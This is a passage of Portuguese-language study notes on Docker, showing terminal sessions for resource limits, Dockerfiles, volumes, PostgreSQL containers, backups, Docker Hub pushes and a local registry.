root@osboxes:~# docker container ls CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES 425c61ede184 nginx &amp;#34;/docker-entrypoint.…&amp;#34; 2 minutes ago Up 2 minutes 80/tcp romantic_hofstadter ca53ed399c0d centos &amp;#34;/bin/bash&amp;#34; 35 hours ago Up 15 minutes pensive_turing root@osboxes:~# docker container rm 425c61ede184 Error response from daemon: You cannot remove a running container 425c61ede184f202b4ae9c3678c429735296fa916253dc953d723414cd3d52cb. Stop the container before attempting removal or force remove root@osboxes:~# docker container rm -f 425c61ede184 425c61ede184 root@osboxes:~# docker container rm -f 425c61ede184 425c61ede184 root@osboxes:~# docker container ls CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES ca53ed399c0d centos &amp;#34;/bin/bash&amp;#34; 35 hours ago Up 18 minutes pensive_turing Configurando CPU e memória para os meus containers Para checar como está o uso de recursos do container, eu utilizo o comando stats
root@osboxes:~# docker container stats 7f824cb8005e Para testar os recursos pode-se utilizar o programa Stress.
root@7f824cb8005e:/# apt-get install stress
Para ver detalhes do seu uso, utilize
$ stress &amp;ndash;help Fiz o seguinte comando
stress --cpu 1 --vm-bytes 128 --vm 1
Posso utilizar para ver os dados também o famoso top
root@osboxes:~# docker container top 7f824cb8005e Claro, se o mesmo estiver instalado no container
Para criar um container do nginx por exemplo com limitação de memória e cpu, eu posso definir isso na criação. Exemplo:
root@osboxes:~# docker container run -d -m 128M --cpus 0.5 nginx Neste caso estou definindo 128MB de ram para o container e que ele se limite a usar só 50% de CPU.
Posso testar utilizando o stress.
Agora quero mudar quero que utilize 80% de CPU, então eu posso fazer um update.
root@osboxes:~# docker container update --cpus 0.8 --memory 64M 7f824cb8005e Agora ele vai utilizar 80% de CPU e 64MB de memória, para o ID que no caso é do nginx.
Criando um Dockerfile Depois de criar uma pasta para alocar o Dockerfile, eu crio um arquivo no vim
FROM debian LABEL app=&amp;#34;BIKER&amp;#34; ENV FXSHELL=&amp;#34;Devops&amp;#34; RUN apt-get update &amp;amp;&amp;amp; apt-get install -y stress &amp;amp;&amp;amp; apt-get clean CMD stress --cpu 1 --vm-bytes 64M --vm 1 Depois de criado, vou buildar
$ docker image build -t toskeira:1.0 root@osboxes:~/tosko_dockerfile# docker image build -t toskeira:1.0 . Sending build context to Docker daemon 2.048kB Step 1/5 : FROM debian latest: Pulling from library/debian 57df1a1f1ad8: Pull complete Digest: sha256:439a6bae1ef351ba9308fc9a5e69ff7754c14516f6be8ca26975fb564cb7fb76 Status: Downloaded newer image for debian:latest ---&amp;gt; f6dcff9b59af Step 2/5 : LABEL app=&amp;#34;moranguinho&amp;#34; ---&amp;gt; Running in c329bf2c69e1 Removing intermediate container c329bf2c69e1 ---&amp;gt; d59dacfad6f9 Step 3/5 : ENV FELIPE=&amp;#34;Lindo&amp;#34; ---&amp;gt; Running in 8c2387746f05 Removing intermediate container 8c2387746f05 ---&amp;gt; 36c9c0b6beb9 Step 4/5 : RUN apt-get update &amp;amp;&amp;amp; apt-get install -y stress &amp;amp;&amp;amp; apt-get clean ---&amp;gt; Running in f4b8d2261527 Get:1 http://security.debian.org/debian-security buster/updates InRelease [65.4 kB] Get:2 http://deb.debian.org/debian buster InRelease [121 kB] Get:3 http://deb.debian.org/debian buster-updates InRelease [51.9 kB] Get:4 http://deb.debian.org/debian buster/main amd64 Packages [7906 kB] Get:5 http://security.debian.org/debian-security buster/updates/main amd64 Packages [233 kB] Get:6 http://deb.debian.org/debian buster-updates/main amd64 Packages [7868 B] Fetched 8387 kB in 11s (794 kB/s) Reading package lists... Reading package lists... Building dependency tree... Reading state information... The following NEW packages will be installed: stress 0 upgraded, 1 newly installed, 0 to remove and 1 not upgraded. Need to get 21.8 kB of archives. After this operation, 55.3 kB of additional disk space will be used. Get:1 http://deb.debian.org/debian buster/main amd64 stress amd64 1.0.4-4 [21.8 kB] debconf: delaying package configuration, since apt-utils is not installed Fetched 21.8 kB in 8s (2708 B/s) Selecting previously unselected package stress. (Reading database ... 6677 files and directories currently installed.) Preparing to unpack .../stress_1.0.4-4_amd64.deb ... Unpacking stress (1.0.4-4) ... Setting up stress (1.0.4-4) ... Removing intermediate container f4b8d2261527 ---&amp;gt; 3662327fda9e Step 5/5 : CMD stress --cpu 1 --vm-bytes 64M --vm 1 ---&amp;gt; Running in 83774952c3c4 Removing intermediate container 83774952c3c4 ---&amp;gt; d24fe1c0773b Successfully built d24fe1c0773b Successfully tagged toskeira:1.0 root@osboxes:~/tosko_dockerfile# Certo, agora se eu der um comando, docker image ls ele vai exibir a nossa imagem recem criada.
root@osboxes:~/tosko_dockerfile# docker image ls REPOSITORY TAG IMAGE ID CREATED SIZE toskeira 1.0 d24fe1c0773b About a minute ago 133MB Para executar
docker container run -d toskeira:1.0 Limitando memoria
docker container run -d --memory 64M toskeira:1.0 Posso também utilizar o comando update.
root@osboxes:~# docker container update --cpus 0.8 --memory 64M [CONTAINER ID] Limitando CPU para 80% e memoria para 64M
#Entendendo volumes
Volumes nada mais sao do que diretorios externos ao container, que são montados diretamente nele, dessa forma bypassam seu filesystem, ou seja, não seguem aquele padrão de camadas.
A principal função do volume é persistir os dados. Diferentemente do filesystem do container, que é volátil e toda informação escrita nele é perdida quando o container morre, quando você escreve em um volume aquele dado continua lá. independentemente do estado do container.
=&amp;gt; É iniciado quando o container é criado
=&amp;gt; Caso ocorra de já haver dados no diretório em que você está montando como volume, ou seja, se o diretório já existe e já está populado na imagem base, aqueles dados serão copiados para o volume.
=&amp;gt; Um volume pode ser reusado e compartilhado entre os containers.
=&amp;gt; Alterações em um volume são feitas diretamente do volume.
=&amp;gt; Alterações em um volume não irão com a imagem quando você fizer uma cópia ou snapshot de um container.
=&amp;gt; Volumes continuam a existir mesmo se você deletar o container.
#Exemplo
Criamos uma pasta para montar nosso volume no local:
root@FXSHELL ~# mkdir /opt/moranguinho Volumes do tipo bind é quando eu já tenho um diretório que quero montar especifico.
root@FXSHELL ~# docker container run -ti --mount type=bind,src=/opt/moranguinho,dst=/moranguinho debian Beleza, já dentro do container crio um arquivo de teste dentro do volume.
root@07b30662ffc0:/# cd moranguinho/ root@07b30662ffc0:/moranguinho# ls root@07b30662ffc0:/moranguinho# ls root@07b30662ffc0:/moranguinho# touch teste root@07b30662ffc0:/moranguinho# exit exit root@FXSHELL ~# cd /opt/moranguinho/ root@FXSHELL /o/moranguinho# ls teste root@FXSHELL /o/moranguinho# Agora se eu executar um outro container, posso notar que o volume continua o mesmo e com o arquivo criado no passo anterior lá dentro.
root@FXSHELL /o/moranguinho# docker container run -ti --mount type=bind,src=/opt/moranguinho,dst=/moranguinho debian root@c72d32bd0846:/# ls bin dev moranguinho lib media opt root sbin sys usr boot etc home lib64 mnt proc run srv tmp var root@c72d32bd0846:/# cd moranguinho/ root@c72d32bd0846:/moranguinho# ls teste root@c72d32bd0846:/moranguinho# root@9911369c74af:/# df -h Filesystem Size Used Avail Use% Mounted on overlay 217G 8.8G 197G 5% / tmpfs 64M 0 64M 0% /dev tmpfs 491M 0 491M 0% /sys/fs/cgroup shm 64M 0 64M 0% /dev/shm /dev/sda1 217G 8.8G 197G 5% /moranguinho tmpfs 491M 0 491M 0% /proc/asound tmpfs 491M 0 491M 0% /proc/acpi tmpfs 491M 0 491M 0% /proc/scsi tmpfs 491M 0 491M 0% /sys/firmware root@9911369c74af:/# Este é o volume do tipo bind
OBS: também posso definir o volume somente como leitura definindo o parametro ro.
root@FXSHELL ~# docker container run -ti --mount type=bind,src=/opt/moranguinho,dst=/moranguinho,ro debian root@FXSHELL /o/moranguinho# docker container run -ti --mount type=bind,src=/opt/moranguinho,dst=/moranguinho,ro debian root@e779e386475a:/# cd moranguinho/ root@e779e386475a:/moranguinho# ls teste teste2 root@e779e386475a:/moranguinho# touch teste3 touch: cannot touch &amp;#39;teste3&amp;#39;: Read-only file system root@e779e386475a:/moranguinho# Mostrando a mensagem como read-only.
#Docker volume
Posso checar todos os volumes criados com o comando:
root@FXSHELL ~# docker volume ls DRIVER VOLUME NAME root@FXSHELL ~# docker volume create moranguinho moranguinho root@FXSHELL ~# ls snap/ tosko_dockerfile/ root@FXSHELL ~# docker volume ls DRIVER VOLUME NAME local moranguinho root@FXSHELL ~# docker volume ls DRIVER VOLUME NAME local moranguinho root@FXSHELL ~# docker volume inspect moranguinho [ { &amp;#34;CreatedAt&amp;#34;: &amp;#34;2021-01-19T20:55:40-05:00&amp;#34;, &amp;#34;Driver&amp;#34;: &amp;#34;local&amp;#34;, &amp;#34;Labels&amp;#34;: {}, &amp;#34;Mountpoint&amp;#34;: &amp;#34;/var/lib/docker/volumes/moranguinho/_data&amp;#34;, &amp;#34;Name&amp;#34;: &amp;#34;moranguinho&amp;#34;, &amp;#34;Options&amp;#34;: {}, &amp;#34;Scope&amp;#34;: &amp;#34;local&amp;#34; } ] root@FXSHELL ~# Tudo e qualquer volume no docker, vai estar dentro de &amp;ldquo;/var/lib/docker/volumes&amp;rdquo;
root@FXSHELL ~# cd /var/lib/docker/volumes/ root@FXSHELL /v/l/d/volumes# ls moranguinho/ metadata.db root@FXSHELL /v/l/d/volumes# Posso colocar meus arquivos dentro da pasta _&amp;quot;data&amp;quot; que fica dentro da pasta do volume
root@FXSHELL /v/l/d/volumes# ls moranguinho/ metadata.db root@FXSHELL /v/l/d/volumes# cd moranguinho/_data/ root@FXSHELL /v/l/d/v/g/_data# touch teste1 teste2 teste3 root@FXSHELL /v/l/d/v/g/_data# ls teste1 teste2 teste3 root@FXSHELL /v/l/d/v/g/_data# Posso montar esse volume também em um container, passando o tipo que agora não será tipo bind, mas sim volume
root@FXSHELL ~# docker container run -ti --mount type=volume,src=moranguinho,dst=/moranguinho debian root@4df1fe08b1da:/# ls bin dev moranguinho lib media opt root sbin sys usr boot etc home lib64 mnt proc run srv tmp var root@4df1fe08b1da:/# cd moranguinho/ root@4df1fe08b1da:/moranguinho# ls teste1 teste2 teste3 root@4df1fe08b1da:/moranguinho# touch teste4_final Depois mato o container e vejo na pasta do volume, e eis o arquivo teste4_final está lá dentro.
root@FXSHELL ~# cd /var/lib/docker/volumes/ root@FXSHELL /v/l/d/volumes# ls moranguinho/ metadata.db root@FXSHELL /v/l/d/volumes# cd moranguinho/_data/ root@FXSHELL /v/l/d/v/g/_data# ls teste1 teste2 teste3 teste4_final root@FXSHELL /v/l/d/v/g/_data# root@FXSHELL /v/l/d/v/g/_data# docker container ls CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES 4983b4a108a3 debian &amp;#34;bash&amp;#34; 11 seconds ago Up 10 seconds frosty_bartik root@FXSHELL /v/l/d/v/g/_data# docker container run -ti --mount type=volume,src=moranguinho,dst=/moranguinho debian root@13aacd8dfd58:/# ls bin dev moranguinho lib media opt root sbin sys usr boot etc home lib64 mnt proc run srv tmp var root@13aacd8dfd58:/# cd moranguinho/ root@13aacd8dfd58:/moranguinho# ls teste1 teste2 teste3 teste4_final root@13aacd8dfd58:/moranguinho# ⏎ root@FXSHELL /v/l/d/v/g/_data# ls teste1 teste2 teste3 teste4_final root@FXSHELL /v/l/d/v/g/_data# docker container ls CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES 13aacd8dfd58 debian &amp;#34;bash&amp;#34; 14 seconds ago Up 12 seconds flamboyant_moore 4983b4a108a3 debian &amp;#34;bash&amp;#34; About a minute ago Up About a minute frosty_bartik root@FXSHELL /v/l/d/v/g/_data# docker container exec -ti 13aacd8dfd58 touch /moranguinho/13aacd8dfd58 root@FXSHELL /v/l/d/v/g/_data# docker container exec -ti 4983b4a108a3 touch /moranguinho/4983b4a108a3 root@FXSHELL /v/l/d/v/g/_data# ls 13aacd8dfd58 4983b4a108a3 teste1 teste2 teste3 teste4_final root@FXSHELL /v/l/d/v/g/_data# Para remover o volume basta remover todos os containers que estiverem em uso com ele.
root@FXSHELL /v/l/d/v/g/_data [1]# docker container ls -a CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES 4df1fe08b1da debian &amp;#34;bash&amp;#34; 9 minutes ago Exited (0) 7 minutes ago zealous_tereshkova e779e386475a debian &amp;#34;bash&amp;#34; 21 minutes ago Exited (1) 20 minutes ago brave_meitner root@FXSHELL /v/l/d/v/g/_data# docker container rm -f 4df1fe08b1da 4df1fe08b1da root@FXSHELL /v/l/d/v/g/_data# docker container rm -f e779e386475a e779e386475a root@FXSHELL /v/l/d/v/g/_data# docker volume rm moranguinho moranguinho root@FXSHELL /v/l/d/v/g/_data# ls E assim dentro da pasta /var/lib não temos mais nada do volume moranguinho.
Posso ver as propriedades do volume criado com o comando:
root@FXSHELL /v/l/d/v/g/_data# docker container run -ti --mount type=volume,src=bolacha,dst=/bolacha debian root@FXSHELL /v/l/d/v/g/_data [1]# docker container inspect 9d5997be4321 &amp;#34;Mounts&amp;#34;: [ { &amp;#34;Type&amp;#34;: &amp;#34;volume&amp;#34;, &amp;#34;Name&amp;#34;: &amp;#34;bolacha&amp;#34;, &amp;#34;Source&amp;#34;: &amp;#34;/var/lib/docker/volumes/bolacha/_data&amp;#34;, &amp;#34;Destination&amp;#34;: &amp;#34;/bolacha&amp;#34;, &amp;#34;Driver&amp;#34;: &amp;#34;local&amp;#34;, &amp;#34;Mode&amp;#34;: &amp;#34;z&amp;#34;, &amp;#34;RW&amp;#34;: true, &amp;#34;Propagation&amp;#34;: &amp;#34;&amp;#34; } Se dou um ls volume, o bolacha ainda estará lá.
root@FXSHELL /v/l/d/v/g/_data# docker volume ls DRIVER VOLUME NAME local bolacha Posso utilizar o comando docker volume prune, para remover todos os volumes que estejam não estejam sendo utilizados.
root@FXSHELL ~# docker volume prune WARNING! This will remove all local volumes not used by at least one container. Are you sure you want to continue? [y/N] y Deleted Volumes: bolacha Total reclaimed space: 0B Posso fazer a mesma coisa para os containers que não estou utilizando mais.
root@FXSHELL ~# docker container prune WARNING! This will remove all stopped containers. Are you sure you want to continue? [y/N] y Deleted Containers: 9911369c74af20bcbf144e1487c326d3d06dd23a0293d7b561e54049f5ddbc56 c72d32bd0846e51a0cbd495909440ee14b64b474611b356704ee3170bf1931b7 07b30662ffc0b0068862768cd6d7c92eafc372d71f5dffc17baca8079cfadf59 ebb965d5043752debf60498d0eac5620ffaecc079af3b557c145539d3d721508 493a598735c5cb1ec6f658df0a4ad5b157562cb462789d19521f1d1fcccbc5fc acda8e5ec1adaaf1f2632be1fa8c2d6aedf9744be643991fea48d0d310fc3150 d7a861d6ea3811ed0273ac32ada6744a26ec85e14ff3b6c6ff5e3462004c3216 bcee760fd5702bb215b99da66109a3a59158aa5a47aae437d7ff4b516f93c38c 3d7c4a379d3e3d6a6710d581034d6199002942990f7d34ae5cb97617dd98ef32 2c6bcccf8f1727817a5da2c9b59edb7afdbb0790e3b3ba16a6298448d3cbb5a6 d21df8a6681620d956610f5e6808b21a0cd960d3c5a5c88da767b39efec4b674 ea431a856eff6fd17ff13d87ae498bfe91fb61fe6566744a528f62c1731689b5 8f88a55195f7defa35196f1d506a1d179af0099afbfcb34a9fd7fefef78240b6 40ab9db51e4a8c6e5603bdb51c60f37925e89d60afab8bda1ddf06071cb06ecc Total reclaimed space: 870.3MB root@FXSHELL ~# docker container ls CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES root@FXSHELL ~# docker container ls -a CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES root@FXSHELL ~# Assim limpando tudo.
Agora um outro teste
root@FXSHELL ~# docker container create -v /opt/bolacha:/data --name dbdados centos 49eeb1ffb2453b206028478bc24f13582f5c1cb2ed2dbb378702ea10a7c5fb0c Com isso, apenas criamos o container e especificamos um volume para ele, mas ainda não o iniciamos.
Sabemos que no container o volume se encontra montado em &amp;ldquo;/data&amp;rdquo;.
Agora vamos criar os containers que rodarão o Postgresql utilizando o volume &amp;ldquo;/data&amp;rdquo; do container &amp;ldquo;dbdados&amp;rdquo; para guardar os dados.
Para isso precisamos entender dois parâmetros importantes:
&amp;ndash;volume-from : É utilizado quando queremos montar um volme disponibilizado por outro container.
-e : É utilizado para informar váriaveis de um ambiente para o container. No exemplo, estamos passando as variáveis de ambiente do PostgreSQL.
root@FXSHELL ~# docker container run -d -p 5432:5432 --name pgsql1 --volumes-from dbdados -e POSTGRESQL_USER=docker -e POSTGRESQL_PASS=docker -e POSTGRESQL_DB=docker kamui/postgresql root@FXSHELL ~# docker container run -d -p 5433:5432 --name pgsql2 --volumes-from dbdados -e POSTGRESQL_USER=docker -e POSTGRESQL_PASS=docker -e POSTGRESQL_DB=docker kamui/postgresql Criei duas.
root@FXSHELL ~# docker container ls -a CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES 79e408793331 kamui/postgresql &amp;#34;/usr/local/bin/run&amp;#34; 8 seconds ago Up 7 seconds 0.0.0.0:5433-&amp;gt;5432/tcp pgsql2 2c2161d46619 kamui/postgresql &amp;#34;/usr/local/bin/run&amp;#34; 6 minutes ago Up 6 minutes 0.0.0.0:5432-&amp;gt;5432/tcp pgsql1 49eeb1ffb245 centos &amp;#34;/bin/bash&amp;#34; 10 minutes ago Created dbdados root@FXSHELL ~# Fazendo da forma nova e atualizada:
root@FXSHELL ~# docker volume create dbdados dbdados root@FXSHELL ~# docker container run -d -p 5432:5432 --name pgsql1 --mount type=volume,src=dbdados,dst=/data -e POSTGRESQL_USER=docker -e POSTGRESQL_PASS=docker -e POSTGRESQL_DB=docker kamui/postgresql 1fbdf3f70d206cebb44049c737e2d08359118df654bcf9481a5a46c99ab47ccc root@FXSHELL ~# docker container run -d -p 5433:5432 --name pgsql2 --mount type=volume,src=dbdados,dst=/data -e POSTGRESQL_USER=docker -e POSTGRESQL_PASS=docker -e POSTGRESQL_DB=docker kamui/postgresql 368bc32d8ca3203dd8962ced0a6a4b999f56751462f121d3100c00169e43e4a8 root@FXSHELL ~# docker container ls CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES 368bc32d8ca3 kamui/postgresql &amp;#34;/usr/local/bin/run&amp;#34; 5 seconds ago Up 3 seconds 0.0.0.0:5433-&amp;gt;5432/tcp pgsql2 1fbdf3f70d20 kamui/postgresql &amp;#34;/usr/local/bin/run&amp;#34; 16 seconds ago Up 14 seconds 0.0.0.0:5432-&amp;gt;5432/tcp pgsql1 root@FXSHELL ~# docker volume ls DRIVER VOLUME NAME local dbdados root@FXSHELL ~# E assim os dados do postgreSQL estão la dentro:
root@FXSHELL ~# cd /var/lib/docker/volumes/dbdados/_data root@FXSHELL /v/l/d/v/d/_data# ls base/ pg_multixact/ pg_stat_tmp/ pg_xlog/ server.key@ global/ pg_notify/ pg_subtrans/ postgresql.conf pg_clog/ pg_serial/ pg_tblspc/ postmaster.opts pg_hba.conf pg_snapshots/ pg_twophase/ postmaster.pid pg_ident.conf pg_stat/ PG_VERSION server.crt@ root@FXSHELL /v/l/d/v/d/_data# Supondo que quero fazer um backup deste cara, e encarrego outro container de fazer isso, posso fazer algo assim:
root@FXSHELL ~# mkdir /opt/backup root@FXSHELL ~# root@FXSHELL ~# root@FXSHELL ~# root@FXSHELL ~# root@FXSHELL ~# docker container run -ti --mount type=volume,src=dbdados,dst=/data --mount type=bind,src=/opt/backup,dst=/backup debian tar -cvf /backup/bkp-banco.tar /data montando um volume do tipo bind dentro deste novo container e empacotando com o tar, o bkp.
#EXEMPLO DE COMANDOS
# docker container run -ti --mount type=bind,src=/volume,dst=/volume ubuntu # docker container run -ti --mount type=bind,src=/root/primeiro_container,dst=/volume ubuntu # docker container run -ti --mount type=bind,src=/root/primeiro_container,dst=/volume,ro ubuntu # docker volume create moranguinho # docker volume rm moranguinho # docker volume inspect moranguinho # docker volume prune # docker container run -d --mount type=volume,source=moranguinho,destination=/var/opa nginx # docker container create -v /data --name dbdados centos # docker run -d -p 5432:5432 --name pgsql1 --volumes-from dbdados -e POSTGRESQL_USER=docker -e POSTGRESQL_PASS=docker -e POSTGRESQL_DB=docker kamui/postgresql # docker run -d -p 5433:5432 --name pgsql2 --volumes-from dbdados -e POSTGRESQL_USER=docker -e POSTGRESQL_PASS=docker -e POSTGRESQL_DB=docker kamui/postgresql # docker run -ti --volumes-from dbdados -v $(pwd):/backup debian tar -cvf /backup/backup.tar /data #Criando um dockerfile
$ vim dockerfiles/1/Dockerfile
FROM debian #qual imagem vou me basear RUN apt-get update &amp;amp;&amp;amp; apt-get install -y apache2 &amp;amp;&amp;amp; apt-get clean #executa oque vai fazer ENV APACHE_LOCK_DIR=&amp;#34;/var/lock&amp;#34; #Variavel de ambiente para não ter dois apache rodando ENV APACHE_PID_FILE=&amp;#34;/var/run/apache2.pid&amp;#34; #Variavel de ambiente de identificação do processo ENV APACHE_RUN_USER=&amp;#34;www.data&amp;#34; #Variavel de ambiente usuário responsável pelo apache ENV APACHE_RUN_GROUP=&amp;#34;www-data&amp;#34; #Variavel de ambiente grupo responsável pelo apache ENV APACHE_LOG_DIR=&amp;#34;/var/log/apache2&amp;#34; #onde vai salvar os logs do apache LABEL description=&amp;#34;Webserver&amp;#34; #faz uma descrição (qualquer chave=valor) LABEL version=&amp;#34;1.0.0&amp;#34; VOLUME /var/www/html #docker vai criar automaticamente esse volume EXPOSE 80 #com a flag -P irá pegar o expose qualquer porta = 80 Para criar o container eu faço um docker build.
root@FXSHELL ~# docker build . ou root@FXSHELL ~# docker image build -t meu_apache:1.0 . #Exemplos de Dockerfiles
FROM debian RUN apt-get update &amp;amp;&amp;amp; apt-get install -y apache2 &amp;amp;&amp;amp; apt-get clean ENV APACHE_LOCK_DIR=&amp;#34;/var/lock&amp;#34; ENV APACHE_PID_FILE=&amp;#34;/var/run/apache2.pid&amp;#34; ENV APACHE_RUN_USER=&amp;#34;www-data&amp;#34; ENV APACHE_RUN_GROUP=&amp;#34;www-data&amp;#34; ENV APACHE_LOG_DIR=&amp;#34;/var/log/apache2&amp;#34; LABEL description=&amp;#34;Webserver&amp;#34; VOLUME /var/www/html/ EXPOSE 80 FROM debian RUN apt-get update &amp;amp;&amp;amp; apt-get install -y apache2 &amp;amp;&amp;amp; apt-get clean ENV APACHE_LOCK_DIR=&amp;#34;/var/lock&amp;#34; ENV APACHE_PID_FILE=&amp;#34;/var/run/apache2/apache2.pid&amp;#34; ENV APACHE_RUN_USER=&amp;#34;www-data&amp;#34; ENV APACHE_RUN_DIR=&amp;#34;/var/run/apache2&amp;#34; ENV APACHE_RUN_GROUP=&amp;#34;www-data&amp;#34; ENV APACHE_LOG_DIR=&amp;#34;/var/log/apache2&amp;#34; LABEL description=&amp;#34;Webserver&amp;#34; VOLUME /var/www/html/ EXPOSE 80 ENTRYPOINT [&amp;#34;/usr/sbin/apachectl&amp;#34;] CMD [&amp;#34;-D&amp;#34;, &amp;#34;FOREGROUND&amp;#34;] package main import &amp;#34;fmt&amp;#34; func main() { fmt.Println(&amp;#34;GIROPOPS STRIGUS GIRUS - LINUXTIPS&amp;#34;) } FROM golang WORKDIR /app ADD . /app RUN go build -o goapp ENTRYPOINT ./goapp FROM golang AS buildando ADD . /src WORKDIR /src RUN go build -o goapp FROM alpine:3.1 WORKDIR /app COPY --from=buildando /src/goapp /app ENTRYPOINT ./goapp ADD =&amp;gt; Copia novos arquivos, diretórios, arquivos TAR ou arquivos remotos e os adicionam ao filesystem do container;
CMD =&amp;gt; Executa um comando, diferente do RUN que executa o comando no momento em que está &amp;ldquo;buildando&amp;rdquo; a imagem, o CMD executa no início da execução do container;
LABEL =&amp;gt; Adiciona metadados a imagem como versão, descrição e fabricante;
COPY =&amp;gt; Copia novos arquivos e diretórios e os adicionam ao filesystem do container;
ENTRYPOINT =&amp;gt; Permite você configurar um container para rodar um executável, e quando esse executável for finalizado, o container também será;
ENV =&amp;gt; Informa variáveis de ambiente ao container;
EXPOSE =&amp;gt; Informa qual porta o container estará ouvindo;
FROM =&amp;gt; Indica qual imagem será utilizada como base, ela precisa ser a primeira linha do Dockerfile;
MAINTAINER =&amp;gt; Autor da imagem;
RUN =&amp;gt; Executa qualquer comando em uma nova camada no topo da imagem e &amp;ldquo;commita&amp;rdquo; as alterações. Essas alterações você poderá utilizar nas próximas instruções de seu Dockerfile;
USER =&amp;gt; Determina qual o usuário será utilizado na imagem. Por default é o root;
VOLUME =&amp;gt; Permite a criação de um ponto de montagem no container;
WORKDIR =&amp;gt; Responsável por mudar do diretório / (raiz) para o especificado nele;
  Um Dockerfile serve para criar uma imagem de um container
A finalidade da instrução FROM no Dockerfile é para indicar uma imagem base
Para &amp;ldquo;buildar&amp;rdquo; uma nova imagem, utilizo o comando, &amp;lsquo;docker build -t nomedaimagem:1.0 .&amp;rsquo;
As instruções para que o Dockerfile adicione um arquivo, são &amp;lsquo;ADD&amp;rsquo; ou &amp;lsquo;COPY&amp;rsquo;
No momento de criação da imagem o Dockerfile executa o comando &amp;lsquo;RUN&amp;rsquo;
Os comandos que executam um comando na inicialização do container são &amp;lsquo;ENTRYPOINT&amp;rsquo; ou &amp;lsquo;CMD&amp;rsquo;
A instrução que indica qual usuário que será utilizado no container é o &amp;lsquo;USER&amp;rsquo;
Indica que determinado diretório no container será um volume com o comando &amp;lsquo;VOLUME&amp;rsquo;
É possível ter duas instruções FROM dentro do mesmo Dockerfile.
Para referenciá-lo em outra parte do arquivo utilizo o &amp;lsquo;FROM debian AS giropops&amp;rsquo;
Para listar todas as imagens do container eu faço &amp;lsquo;docker image ls&amp;rsquo;
É possível criar uma imagem a partir de um container em execução.
Com o comando &amp;ldquo;docker commit&amp;rdquo; eu crio uma imagem apartir de um container em execução.
  **
#SUBINDO UMA IMAGEM PARA SUA CONTA DO DOCKERHUB
root@FXSHELL ~/d/2# docker image ls REPOSITORY TAG IMAGE ID CREATED SIZE fpmatta/toddy 1.0 e1c0c1113bca 6 minutes ago 267MB ubuntu latest f63181f19b2f 12 days ago 72.9MB root@FXSHELL ~/d/2# docker login Authenticating with existing credentials... WARNING! Your password will be stored unencrypted in /root/.docker/config.json. Configure a credential helper to remove this warning. See https://docs.docker.com/engine/reference/commandline/login/#credentials-store Login Succeeded root@FXSHELL ~/d/2# docker push fpmatta/toddy:1.0 The push refers to repository [docker.io/fpmatta/toddy] b43d9cffa997: Pushing [==============================================&amp;gt; ] 178.2MB/193.7MB 02473afd360b: Mounted from library/ubuntu dbf2c0f42a39: Preparing 9f32931c9d28: Preparing #Não confio na internet; posso criar o meu registry local
Subindo o registry local:
root@FXSHELL ~# docker container run -d -p 5000:5000 --restart=always --name registry registry:2 Consigo ver o container do registry rodando bem como sua imagem.
root@FXSHELL ~# docker container ls CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES 49fbebd0365b registry:2 &amp;#34;/entrypoint.sh /etc…&amp;#34; 34 seconds ago Up 32 seconds 0.0.0.0:5000-&amp;gt;5000/tcp registry root@FXSHELL ~# docker image ls REPOSITORY TAG IMAGE ID CREATED SIZE fpmatta/toddy 1.0 e1c0c1113bca 31 minutes ago 267MB registry 2 678dfa38fcfa 6 weeks ago 26.2MB root@FXSHELL ~# Preciso retagear o nome da minha imagem, passando o meu registry local que no caso é o &amp;lsquo;localhost:5000&amp;rsquo;
root@FXSHELL ~# docker image ls REPOSITORY TAG IMAGE ID CREATED SIZE fpmatta/toddy 1.0 e1c0c1113bca 31 minutes ago 267MB registry 2 678dfa38fcfa 6 weeks ago 26.2MB root@FXSHELL ~# docker tag e1c0c1113bca localhost:5000/fpmatta/toddy:1.0 root@FXSHELL ~# docker image ls REPOSITORY TAG IMAGE ID CREATED SIZE fpmatta/toddy 1.0 e1c0c1113bca 35 minutes ago 267MB localhost:5000/fpmatta/toddy 1.0 e1c0c1113bca 35 minutes ago 267MB registry 2 678dfa38fcfa 6 weeks ago 26.2MB root@FXSHELL ~# docker image push localhost:5000/fpmatta/toddy:1.0 The push refers to repository [localhost:5000/fpmatta/toddy] b43d9cffa997: Pushing [==================================================&amp;gt;] 199.9MB 02473afd360b: Pushed dbf2c0f42a39: Pushed 9f32931c9d28: Pushed Para checar sua imagem dentro do registry fica no caminho abaixo:
/var/lib/registry/docker/registry/v2/repositories/fpmatta/toddy root@FXSHELL ~# docker container ls CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES a3c92b51fe5b localhost:5000/fpmatta/toddy:1.0 &amp;#34;/bin/bash&amp;#34; 13 minutes ago Up 13 minutes exciting_heyrovsky 49fbebd0365b registry:2 &amp;#34;/entrypoint.sh /etc…&amp;#34; 30 minutes ago Up 30 minutes 0.0.0.0:5000-&amp;gt;5000/tcp registry root@FXSHELL ~# docker exec -ti 49fbebd0365b sh / # ls bin entrypoint.sh home media opt root sbin sys usr dev etc lib mnt proc run srv tmp var / # cd /var/ cache/ empty/ lib/ local/ lock/ log/ mail/ opt/ run/ spool/ tmp/ / # cd /var/lib/ apk/ misc/ registry/ udhcpd/ / # cd /var/lib/registry/docker/registry/v2/ /var/lib/registry/docker/registry/v2 # ls blobs repositories /var/lib/registry/docker/registry/v2 # cd repositories/ /var/lib/registry/docker/registry/v2/repositories # ls fpmatta /var/lib/registry/docker/registry/v2/repositories # cd fpmatta/ /var/lib/registry/docker/registry/v2/repositories/fpmatta # ls toddy /var/lib/registry/docker/registry/v2/repositories/fpmatta # cd toddy/ /var/lib/registry/docker/registry/v2/repositories/fpmatta/toddy # ls _layers _manifests _uploads /var/lib/registry/docker/registry/v2/repositories/fpmatta/toddy #  #DockerHub e Registry - Exemplo comandos docker image inspect debian
docker history linuxtips/apache:1.0
docker login
docker login registry.suaempresa.com
docker push linuxtips/apache:1.0
docker pull linuxtips/apache:1.0
docker image ls
docker container run -d -p 5000:5000 &amp;ndash;restart=always &amp;ndash;name registry registry:2
docker tag IMAGEMID localhost:5000/apache
Docker Machine Para fazer a instalação do Docker Machine no Linux, faça:
